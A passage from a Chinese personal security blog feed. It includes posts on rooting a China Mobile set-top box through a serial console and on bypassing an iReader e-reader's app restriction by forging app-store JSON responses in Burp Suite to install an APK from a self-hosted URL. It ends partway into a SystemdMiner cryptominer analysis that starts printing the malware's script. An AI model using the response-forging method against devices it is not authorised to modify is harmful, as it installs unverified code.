88x2bu<br></code></pre></td></tr></table></figure><p>执行以上命令，未遇到相关错误，到这一步，你的USB网卡已经可以加载上去了，你可以通过命令行查看：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure><p><img src="/img/20211115-04.png" alt="20211115-04.png"><br>也可以直接通过配置图形界面去查看，我这里没截图，就这样吧。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>尝试加载到dkms，失败了，感觉短时间解决不了，可以成功加载网卡，使服务器可以连接到网络，已经满足我的要求了，无线质量不错，但是网速一般，有空得排查一下原因。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/Tencent/secguide">https://github.com/Tencent/secguide</a>【腾讯安全编码指南】</li><li><a href="https://github.com/cilynx/rtl88x2bu">https://github.com/cilynx/rtl88x2bu</a>【rtl88x2bu】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>构建金融企业安全编码规范</title>
    <link href="/2021/11/14/2021-11-14-build-a-financial-enterprise-security-code-guide/"/>
    <url>/2021/11/14/2021-11-14-build-a-financial-enterprise-security-code-guide/</url>
    
    <content type="html"><![CDATA[<p>构建金融企业安全编码规范</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>本文主要是博主在为金融企业制定安全编码规范过程中的一些经验和总结，如有不足，请斧正。</p><h2 id="构建安全编码规范的意义"><a href="#构建安全编码规范的意义" class="headerlink" title="构建安全编码规范的意义"></a>构建安全编码规范的意义</h2><h2 id="如何构建有效的安全编码审查机制"><a href="#如何构建有效的安全编码审查机制" class="headerlink" title="如何构建有效的安全编码审查机制"></a>如何构建有效的安全编码审查机制</h2><h2 id="如果构建行之有效的安全编码规范"><a href="#如果构建行之有效的安全编码规范" class="headerlink" title="如果构建行之有效的安全编码规范"></a>如果构建行之有效的安全编码规范</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/Tencent/secguide">https://github.com/Tencent/secguide</a>【腾讯安全编码指南】</li><li><a href=""></a>【】</li><li><a href=""></a>【】</li><li><a href=""></a>【】</li><li><a href=""></a>【】</li><li><a href=""></a>【】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Code Audit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>魔百盒CM211破解</title>
    <link href="/2021/11/11/2021-11-11-mobaihe-cm211-crack/"/>
    <url>/2021/11/11/2021-11-11-mobaihe-cm211-crack/</url>
    
    <content type="html"><![CDATA[<p>魔百盒CM211破解</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前家里就有一台投影仪，有一个N1盒子刷的电视系统，支持4K播放，满足日常影音需求。换工作，新租的房子有一台电视，办理宽带的时候强制安装一个网络机顶盒，只能播放部分卫视频道和付费视频，不能安装第三方的视频软件，周末有空尝试破解一下。以下是魔百盒的解释，来源于互联网：</p><blockquote><p>移动魔百盒是中国移动推出的网络机顶盒。与市面上的其他电视盒类似，移动魔百盒支持视频，音乐等内容资源播放，还提供部分互动游戏作为补充。移动魔百盒一般随移动宽带业务一同开通，与宽带套餐绑定。</p></blockquote><h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>需要准备：电烙铁，排针，TTL转USB，螺丝刀</p><h3 id="拆机"><a href="#拆机" class="headerlink" title="拆机"></a>拆机</h3><p>拆机步骤较为简单，注意不要使用蛮力，拆解很简单，注意两条螺丝的位置<br><img src="/img/20211111-01.png" alt="20211111-01.png"><br>以下这张图来源于互联网，当时我焊接的时候忘了拍照了<br><img src="/img/20211111-02.png" alt="20211111-02.png"></p><h3 id="焊接排针"><a href="#焊接排针" class="headerlink" title="焊接排针"></a>焊接排针</h3><p>排针焊接好的效果如下：<br><img src="/img/20211111-03.png" alt="20211111-03.png"></p><h3 id="TTL调试"><a href="#TTL调试" class="headerlink" title="TTL调试"></a>TTL调试</h3><p>串口定义以上图为主，从左向右分别是VCC TX RX GND<br>TTL调试，只需要连接TX RX GND，注意主板上的TX RX和TTL调试器上标注的是相反的。<br><img src="/img/20211111-04.png" alt="20211111-04.png"></p><p>使用putty或者其他com端口控制程序，我这里用的是picocom,打开相关串口进行调试，此处不过多解释<br><img src="/img/20211111-05.png" alt="20211111-05.png"></p><h3 id="安装第三方软件"><a href="#安装第三方软件" class="headerlink" title="安装第三方软件"></a>安装第三方软件</h3><p>在终端中输入以下命令，启动adb调试服务：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-literal">start</span>  adbd<br></code></pre></td></tr></table></figure><p>这时候你可以通过通过adb进行远程调试，方便不少，然后可以利用一些TV助手，或者直接使用adb远程连接，使用命令安装apk<br>adb安装命令如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">adb</span> install <span class="hljs-regexp">*.apk</span><br></code></pre></td></tr></table></figure><p>我这里直接安装了一个当贝助手，然后安装了一个当贝桌面，其他就没动，重启以后直接进入当贝桌面，可以打开当贝助手安装第三方软件<br><img src="/img/20211111-06.jpg" alt="20211111-06.jpg"></p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>这个盒子性能太弱了，安装一个腾讯视频TV版，不定期卡死然后重启应用，这个就有些逗逼了，估计后续还得更换N1，这里只是单纯记录一下。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://post.smzdm.com/p/a6d563ge/">https://post.smzdm.com/p/a6d563ge/</a>【魔百盒CM211-1折腾日记】</li><li><a href="https://www.znds.com/tv-387215-1-1.html">https://www.znds.com/tv-387215-1-1.html</a>【任何魔百盒都通用的刷机教程 】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>掌阅ireader smart xs pro 安装第三方软件</title>
    <link href="/2021/11/09/2021-11-09-ireader-smart-xs-pro-crack/"/>
    <url>/2021/11/09/2021-11-09-ireader-smart-xs-pro-crack/</url>
    
    <content type="html"><![CDATA[<p>掌阅ireader smart xs pro 安装第三方软件</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>给媳妇买了一个掌阅ireader smart xs pro,比普通版本多花1k,就为了一个手写,这个败家娘们,不过喜欢就行,千金难买美人一笑,这就扯远了,主要是这玩意只能安装自己应用商城里面的软件,并且只有一个微信读书,这就很难受,网上查了一下,看到有人利用设备重启不断使用adb安装命令,部分设备可以安装成功,这个也是溜,不过我在smart xs上尝试了一下,有反应,但是报错了,有些玄学,这里就不折腾了,发现ireader设备就是一个安卓设备魔改的,并且可以设置代理,正好抓个包看看。本文是一篇水文，没过多的技术价值，各位看官酌情审阅。</p><p><img src="/img/20211109-01.jpg" alt="20211109-01.jpg"></p><p>注意:<br>    1.本文描述的操作对安全测试人员来说很简单,对普通用户有一定的技术门槛,涉及burpsuite，docker，aapt等命令的使用及相关环境搭建，请注意，另外一点，如果端口无法访问或者无法抓取数据包，请检查一下防火墙对应端口是否启用。<br>    2.本次绕过系统限制安装第三方软件仅限于ireader smart xs pro 型号为:SR801 系统版本号为:10.6.0.90 软件版本号为:6.10010.1090(109969),对于其他版本和平台并未测试，如果导致ireader出现死机或者质保失效等问题，本人会力所能及协助你处理，但是本人不背锅。<br>    3.绕过系统限制安装第三方软件这个bug已和官方同步,但是没啥反馈,估计官方也懒得修了,正好做个技术分享造福各位网友。<br>    4.对于burpsuite两次响应包的json数据我都在文章提供了，有需要的同学可以直接复制使用，注意根据实际情况替换部分数值。</p><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><h3 id="抓包配置"><a href="#抓包配置" class="headerlink" title="抓包配置"></a>抓包配置</h3><p>和正常安卓测试配置代理一样,通过wifi选项配置代理,接入个人无线网络,我这里代理服务器的ip为:192.168.3.209,代理端口为:8080<br><img src="/img/20211109-02.jpg" alt="20211109-02.jpg"></p><p><img src="/img/20211109-03.jpg" alt="20211109-03.jpg"></p><p>burpsuite配置<br>在代理服务器的burpsuite配置,监听192.168.3.209,端口为8080.<br><img src="/img/20211109-04.png" alt="20211109-04.png"><br>点击http history,然后在ireader上点击几个需要网络同步的功能,看burpsuite上是否能截获ireader的请求包,以下截图就是获取到http相关请求包.<br><img src="/img/20211109-05.png" alt="20211109-05.png"><br>如果获取不到,检查是否启用防火墙,配置是否正确等等,这里不过多阐述.</p><p>通过分析,发现在安装软件过程中,通过伪造响应包,替换响应包中appName和apk下载路径,由于ireader安装程序未校验下载的apk及相关内容,因此可以通过篡改响应数据诱导ireader安装程序安装自定义url的软件包.</p><h3 id="构造apk下载服务HTTP"><a href="#构造apk下载服务HTTP" class="headerlink" title="构造apk下载服务HTTP"></a>构造apk下载服务HTTP</h3><p>我这里直接使用docker启动了一个apache的容器,搭建了一个文件下载服务器,相关命令如下:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> -dit --name apache2 -p 12345:80 -v /data/apache:/usr/local/apache2/htdocs/ httpd</span><br></code></pre></td></tr></table></figure><blockquote><p>这里映射宿主机的目录为:&#x2F;data&#x2F;apache,如果新人搭建,注意目录是否拥有权限,搭建成功的标识是你访问: <a href="http://your/">http://your</a> ip address:12345 会列举出:&#x2F;data&#x2F;apache目录下的所有文件<br>也可以搭建其他http的文件下载服务,类型不限,总之能通过url下载apk包即可,这里需要注意的是apk包需要压缩成zip格式.<br><img src="/img/20211109-12.png" alt="20211109-12.png"></p></blockquote><h3 id="安装第三方软件"><a href="#安装第三方软件" class="headerlink" title="安装第三方软件"></a>安装第三方软件</h3><p>点击burpsuite拦截按钮,点击ireader设置-工具,在工具界面下,点击右上方的应用市场的按钮<br><img src="/img/20211109-06.jpg" alt="20211109-06.jpg"></p><p>你的burpsuite代理会捕获到一个请求包,你需要在请求包的窗口上右击,依次点击Do intercept-&gt; Reponse to this request,这是一个很典型的修改响应数据包的操作.<br><img src="/img/20211109-08.png" alt="20211109-08.png"></p><p>点击Forward,转发数据包.将响应的数据包中的appName进行替换,替换成你想安装的安卓软件包的名称,如何获取软件包的名称,请参考aapt工具的使用,我这里简洁带过.<br><img src="/img/20211109-09.png" alt="20211109-09.png"></p><blockquote><p>比如我们要安装创建快捷方式这个apk,查看apk的命令是:<code>aapt dump badging ShortcutCreator_*.apk</code><br><img src="/img/20211109-10.png" alt="20211109-10.png"></p></blockquote><p>创建快捷方式apk的appName为:com.x7890.shortcutcreator,替换以后的响应包为：<br><img src="/img/20211109-11.png" alt="20211109-11.png"><br>响应包JSON数据为：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;body&quot;</span>:&#123;<span class="hljs-string">&quot;list&quot;</span>:[&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>5fae<span class="hljs-char escape_">\u</span>4fe1<span class="hljs-char escape_">\u</span>8bfb<span class="hljs-char escape_">\u</span>4e66&quot;</span>,<span class="hljs-string">&quot;icon&quot;</span>:<span class="hljs-string">&quot;http:<span class="hljs-char escape_">\/</span><span class="hljs-char escape_">\/</span>bookbk.img.ireader.com<span class="hljs-char escape_">\/</span>idc_1<span class="hljs-char escape_">\/</span>m_1,w_300,h_400<span class="hljs-char escape_">\/</span>75013979<span class="hljs-char escape_">\/</span>group61<span class="hljs-char escape_">\/</span>M00<span class="hljs-char escape_">\/</span>EE<span class="hljs-char escape_">\/</span>E0<span class="hljs-char escape_">\/</span>CmQUOGEwpDqEX51AAAAAAAeM1VA414608802.png?v=ckr1QuK3&amp;t=CmQUOGEwpDo.&quot;</span>,<span class="hljs-string">&quot;appVersion&quot;</span>:<span class="hljs-string">&quot;V1.8.1&quot;</span>,<span class="hljs-string">&quot;appSize&quot;</span>:<span class="hljs-string">&quot;18.6MB&quot;</span>,<span class="hljs-string">&quot;appName&quot;</span>:<span class="hljs-string">&quot;com.x7890.shortcutcreator&quot;</span>,<span class="hljs-string">&quot;appDesc&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;],<span class="hljs-string">&quot;page&quot;</span>:&#123;<span class="hljs-string">&quot;currentPage&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;pageSize&quot;</span>:<span class="hljs-number">7</span>,<span class="hljs-string">&quot;totalPage&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;totalRecord&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>点击forward,我们将伪造好的数据包转发给ireader.这时候ireader存储的微信读书的appName已经被篡改了.<br><img src="/img/20211109-13.jpg" alt="20211109-13.jpg"></p><blockquote><p>注意:这里有个小技巧,如果操作不熟练,可以将整个json数据在记事本中修改好了再复制到burpsuite中</p></blockquote><p>点击下载按钮,弹出提示对话框,点击确定,这时候burpsuite会捕获到一个请求包,和上述同样的操作,需要篡改响应包<br><img src="/img/20211109-14.jpg" alt="20211109-14.jgp"><br>burpsuite请求包截图<br><img src="/img/20211109-15.png" alt="20211109-15.png"><br>因为篡改了appName，正常burpsuite响应包应该是空的，burpsuite截图如下:<br><img src="/img/20211109-16.png" alt="20211109-16.png"></p><p>burpsuite响应包中将appName替换成 <code>com.x7890.shortcutcreator</code>,appurl替换成我们实现构造好的apk url地址,我这里的地址为:<code>http://192.168.3.209:12345/ShortcutCreator_1.17-199043-o_1d2ncpumt4f4tu0daf1qkb15i310-uid-906093.zip</code><br><img src="/img/20211109-17.png" alt="20211109-17.png"><br>构造后的响应包json数据内容如下：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;body&quot;</span>:&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>5fae<span class="hljs-char escape_">\u</span>4fe1<span class="hljs-char escape_">\u</span>8bfb<span class="hljs-char escape_">\u</span>4e66&quot;</span>,<span class="hljs-string">&quot;icon&quot;</span>:<span class="hljs-string">&quot;http:<span class="hljs-char escape_">\/</span><span class="hljs-char escape_">\/</span>bookbk.img.ireader.com<span class="hljs-char escape_">\/</span>idc_1<span class="hljs-char escape_">\/</span>m_1,w_300,h_400<span class="hljs-char escape_">\/</span>75013979<span class="hljs-char escape_">\/</span>group61<span class="hljs-char escape_">\/</span>M00<span class="hljs-char escape_">\/</span>EE<span class="hljs-char escape_">\/</span>E0<span class="hljs-char escape_">\/</span>CmQUOGEwpDqEX51AAAAAAAeM1VA414608802.png?v=ckr1QuK3&amp;t=CmQUOGEwpDo.&quot;</span>,<span class="hljs-string">&quot;appVersion&quot;</span>:<span class="hljs-string">&quot;V1.8.1&quot;</span>,<span class="hljs-string">&quot;appSize&quot;</span>:<span class="hljs-string">&quot;18.6MB&quot;</span>,<span class="hljs-string">&quot;categoryId&quot;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&quot;appName&quot;</span>:<span class="hljs-string">&quot;com.x7890.shortcutcreator&quot;</span>,<span class="hljs-string">&quot;appUrl&quot;</span>:<span class="hljs-string">&quot;http://192.168.3.209:12345/ShortcutCreator_1.17-199043-o_1d2ncpumt4f4tu0daf1qkb15i310-uid-906093.zip&quot;</span>,<span class="hljs-string">&quot;appDesc&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;explain&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;&#125;<br><br></code></pre></td></tr></table></figure><p>点击forward,转发数据包,在次期间,如果速度比较慢,可能会有多个相同的请求,需要执行以上相同的步骤来伪造响应包进行重放,响应包的内容均相同.<br>如果伪造成功了,你的ireader就会自动下载apk包并进行安装,如果失败,查找原因,再尝试一下以上步骤.<br>以下截图是伪造成功后，burpsuite截获的ireader请求下载apk的请求。<br><img src="/img/20211109-18.png" alt="20211109-18.png"></p><p>最终结果:<br><img src="/img/20211109-07.jpg" alt="20211109-07.jpg"></p><blockquote><p>伪造请求的方式有很多，我这里只是一个引子，各位巨佬可以各显神通就行。</p></blockquote><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="使用快捷方式apk配置系统参数"><a href="#使用快捷方式apk配置系统参数" class="headerlink" title="使用快捷方式apk配置系统参数"></a>使用快捷方式apk配置系统参数</h3><p>创建快捷方式apk，可以打开系统设置中的某些隐藏项，比如打开ireader的安卓设置界面。步骤如下：<br>1、打开创建快捷方式APK， 选择右上角的3个点，选择【也显示系统应用】<br><img src="/img/20211109-20.jpg" alt="20211109-20.jpg"><br>2、在应用选择里面搜索<code>设置</code>，点击设置的活动列表按钮<br><img src="/img/20211109-21.png" alt="20211109-21.png"><br>3、在活动列表界面，点击第一个设置的<code>详情</code>按钮<br><img src="/img/20211109-23.png" alt="20211109-23.png"><br>4、点击详情界面的打开按钮<br><img src="/img/20211109-22.png" alt="20211109-22.png"><br>5、进入熟悉的安卓设置界面<br><img src="/img/20211109-24.jpg" alt="20211109-24.jpg"><br>到这里你就可以进入到系统设置界面，然后进行愉快的设置了。部分方案里面使用<strong>创建快捷方式apk</strong>启用未知来源选项，然后调用文件管理相关软件或者应用市场来安装apk,但是在我这台ireader有些差别，因为在系统设置-安全菜单下并没有那个未知来源的相关选项。所以才有了接下来启动未知来源相关选项的操作。</p><h3 id="启用未知来源"><a href="#启用未知来源" class="headerlink" title="启用未知来源"></a>启用未知来源</h3><p>每次都使用burpsuite来伪造响应包进而安装软件，这种方法着实太费劲了，既然是安卓系统，下载一个应用商城来安装第三方软件岂不更香，然后我就下载了一个酷安apk来安装，主要是创建快捷方式apk就是从酷安官网下载的，这里就直接下载一个酷安来进行后续安装。<br>重复以上步骤，成功安装酷安，然后遇到一个新问题就是使用酷安安装其他软件会提示 <strong>禁止在平板安装未知来源的软件</strong> 通常解决方案是在系统设置下-安全-打开未知来源。但是ireader是安卓魔改以后的系统，根本没有那个选项，这就尴尬了。<br><img src="/img/20211109-19.jpg" alt="20211109-19.jpg"></p><p>后来在我不懈的努力下终于找到了，在系统设置-应用和通知菜单下，选择酷安，这里有个坑，不会列举出所有的应用，点击特殊应用权限下的安装未知应用，竟然没反应，要不是我设备有问题，要不就是官方做了限制.<br><img src="/img/20211109-25.jpg" alt="20211109-25.jpg"><br>最后在我不断的努力下，通过点击最近打开应用下面列举出来的应用，我这里提前运行了一下酷安apk,然后重复以上进入系统设置操作，最后在最近打开应用下点击酷安，进入酷安的权限配置界面。<br><img src="/img/20211109-26.jpg" alt="20211109-26.jpg"><br>点击高级，在高级权限配置界面上选择安装未知应用。<br><img src="/img/20211109-27.png" alt="20211109-27.png"><br>启用安装未知应用。<br><img src="/img/20211109-28.jpg" alt="20211109-28.jpg"><br>到这里就可以启用酷安apk安装未知应用的权限，同样的方法也可以用到启用文件管理器上，启用文件管理器的安全未知应用权限，这样就可以通过文件管理器安装第三方应用。</p><hr><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><h3 id="2021年12月12日更新"><a href="#2021年12月12日更新" class="headerlink" title="2021年12月12日更新"></a>2021年12月12日更新</h3><p>系统更新到10.6.0.93以后，使用以上的教程会出现安装失败的问题，后续分析发现，新版系统安装包的构建方式不一样，旧版是直接更改apk包名后缀为zip，新版需要将apk包压缩成zip格式，与之前不一样的是，多了两个文本配置文件，进过测试，没有也可以成功安装。所以在构造apk下载服务时需要注意，将需要安装的apk包直接压缩成zip格式，其他步骤不变。<br>感谢网友@阿辉的反馈，进过测试，在Ireader smart2 (系统版本为：10.6.0.93)上同样可以利用以上方法成功安装第三方软件。</p><p>另外需要注意，不同设备打开安装未知应用的方式可能存在差别，请自行测试启用。</p><h3 id="2022年01月08日更新"><a href="#2022年01月08日更新" class="headerlink" title="2022年01月08日更新"></a>2022年01月08日更新</h3><p>网友@郎咸蒙 反馈软件安装完毕后，显示效果比较差，通过修改显示模式缓解，其他小伙伴遇到了类似的情况可以自行修改一下，另外该网友自建了一个代理服务器，自动化处理安装请求，有需要的小伙伴可以参考一下：<a href="https://kikicoding.cn/ireadersmart2.html">https://kikicoding.cn/ireadersmart2.html</a> ,安全性和稳定性各位网友自行判断即可。</p><p>网友@紫荆 反馈ireader smart2 安装了部分软件，导致开机进入系统以后黑屏，个人感觉可能有两个原因，一个就是该网友自行修改了系统部分配置信息，或者修改了默认界面，软件自启动之类的，这个只是猜测，无法核实，另一种就是该网友安装了除我提及到的软件，还安装了一个via浏览器，不太清楚是否是软件冲突导致的问题。</p><p>目前鄙人提供的方法只是绕过系统限制，不会修改系统核心配置等信就可以完成安装第三方软件操作，遇到了兼容性问题，软件冲突等问题，本人也无法解决，安装第三方软件，建议三思而后行，另外如果遇到系统崩溃或者死机等无法解决的问题，直接联系售后走售后流程即可，需要注意一点儿就是不要和售后说太多无关紧要的内容，言多必失。</p><h3 id="2022年07月21日更新"><a href="#2022年07月21日更新" class="headerlink" title="2022年07月21日更新"></a>2022年07月21日更新</h3><p>根据网友反馈和自己实际测试，发现ireader新版系统已使用https进行通信，故此方法截至今天宣布失效，当前系统版本(10.7.0.96)已失效，各位在复现本文章要注意系统版本，我有空也会再分析一下ireader，如果有新的破解方法，我会及时发出来，各位网友如果碰到好的方法也可以和我聊聊，开机重复执行adb install apk，这种方法就不用和我沟通了。</p><h2 id="Todo"><a href="#Todo" class="headerlink" title="Todo"></a>Todo</h2><ul><li><input checked="" disabled="" type="checkbox"> 安装第三方软件</li><li>[] 启用开发者模式(常规启动开发者模式并未成功，正在分析)</li><li>[] 启动adb调试</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://store.ireader.com/product/index?type=Smart&id=383890&source=">http://store.ireader.com/product/index?type=Smart&id=383890&source=</a>【ireader smart xs pro】</li><li><a href="https://www.coolapk.com/apk/com.x7890.shortcutcreator">https://www.coolapk.com/apk/com.x7890.shortcutcreator</a>【创建快捷方式apk】</li><li><a href="https://zhuanlan.zhihu.com/p/352846630">https://zhuanlan.zhihu.com/p/352846630</a>【看这里，掌阅facenote阅读器安装第三方应用方法】</li><li><a href="https://www.coolapk.com/">https://www.coolapk.com/</a>【酷安官网】</li><li><a href="https://thismj.cn/2019/03/06/aapt-ming-ling-xing-shi-yong-shi-jian/">https://thismj.cn/2019/03/06/aapt-ming-ling-xing-shi-yong-shi-jian/</a>【AAPT命令行使用实践】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SystemdMiner 挖矿木马分析</title>
    <link href="/2021/11/08/2021-11-08-systemd-miner-analysis/"/>
    <url>/2021/11/08/2021-11-08-systemd-miner-analysis/</url>
    
    <content type="html"><![CDATA[<p>SystemdMiner 挖矿木马分析与处置</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前应急时捕获分析过一个挖矿样本，后续因为逆向功底太差就搁置了，最近带新人尝试重新分析这个样本，发现这个挖矿样本仍然存活，并且有了不少改进。以下截图是2021年11月6日捕获的样本并提交virustotal分析的结果，首次提交并且只有一个引擎提示风险，话不多说，直接进行分析。<br><img src="/img/20211108-01.png" alt="20211108-01.png"><br>申明一点儿：事后，全网检索了一下，发现有部分内容和SystemdMiner是有关联的，部分文章将发现的相关样本称为SystemdMiner挖矿木马，该样本我在19年12月首次捕获并进行分析，当时由于脚本伪装成aliyun.sh，我尚未起名，以标题为《一个名叫aliyun的挖矿木马处理过程》进行分析和通报，深信服的一篇分析文章的概述写到：</p><blockquote><p>最近，深信服安全团队捕获到SystemdMiner挖矿木马最新变种，该家族在2019年被首次发现，起初因其组件都以systemd-<XXX>命名而得名，但慢慢的，它们开始弃用systemd的命名形式，改为了随机名。<br>我又全网检索了一下，感觉和大名鼎鼎的SystemdMiner挖矿木马差别不少，具体对比参考360 netlab的分析文章，我感觉我之前捕获的样本和大名鼎鼎的SystemdMiner家族挖矿木马差别很大，只是部分功能有借鉴。本人非一线安全研究人员，此处是个人观点，没必要上纲上线。为了方便称呼，以下均称为：SystemdMiner挖矿木马。</p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h3><p>挖矿现象很明显，直接把我这个小破本的CPU性能压榨的一滴不剩。<br><img src="/img/20211108-02.png" alt="20211108-02.png"><br>想都不用想，如果直接杀掉挖矿进程稍等片刻就会有另一个随机命名的挖矿进程继续运行，继续压榨我这个小破本。对于中招的用户，可以先kill掉挖矿进程，然后再系统的处置入侵相关事宜。</p><h3 id="提取样本"><a href="#提取样本" class="headerlink" title="提取样本"></a>提取样本</h3><h4 id="挖矿进程"><a href="#挖矿进程" class="headerlink" title="挖矿进程"></a>挖矿进程</h4><p>挖矿的进程是23632，查看该进程相关信息，进入&#x2F;proc&#x2F;23632目录，运行文件已删除。<br><img src="/img/20211108-03.png" alt="20211108-03.png"><br>&#x2F;proc&#x2F;23632&#x2F;fd目录下发现关联的一些文件信息<br><img src="/img/20211108-04.png" alt="20211108-04.png"><br>如果看过之前分析的第一篇文章，对 &#x2F;tmp&#x2F;.X11-unix&#x2F;目录文件应该不陌生，里面的文件存储着远控和挖矿进程id信息。<br><img src="/img/20211108-05.png" alt="20211108-05.png"></p><p>我们先将已删除的文件提取出来<br><img src="/img/20211108-07.png" alt="20211108-07.png"></p><p>提交到virustotal分析，发现几天前应该是有人中招了。<br><img src="/img/20211108-08.png" alt="20211108-08.png"></p><h4 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h4><p>接下来轻车熟路，进入&#x2F;tmp&#x2F;.X11-unix&#x2F;，查看其他进程信息。<br><img src="/img/20211108-09.png" alt="20211108-09.png"><br>其中名为22的文件内容为空，不清楚原因，出了挖矿的，另一个名为01的文件，应该存储着远控的进程id，这里是22545。<br><img src="/img/20211108-10.png" alt="20211108-10.png"><br>同样的配方，导出远控的进程<br><img src="/img/20211108-11.png" alt="20211108-11.png"></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>通过仔细查找，发现root目录下存在两个可疑文件：<br><img src="/img/20211108-12.png" alt="20211108-12.png"></p><ul><li>.systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh</li><li>.unixdb.sh</li></ul><p>.systemd-private-a7sebNyLZedpFNW6SxqOF2F7ggZv2te.sh脚本内容如下：<br><img src="/img/20211108-13.png" alt="20211108-13.png"><br>文本内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"> <span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">exec</span> &amp;&gt;/dev/null<br><span class="hljs-built_in">echo</span> a7sebNyLZedpFNW6SxqOF2F7ggZv2te<br><span class="hljs-built_in">echo</span> 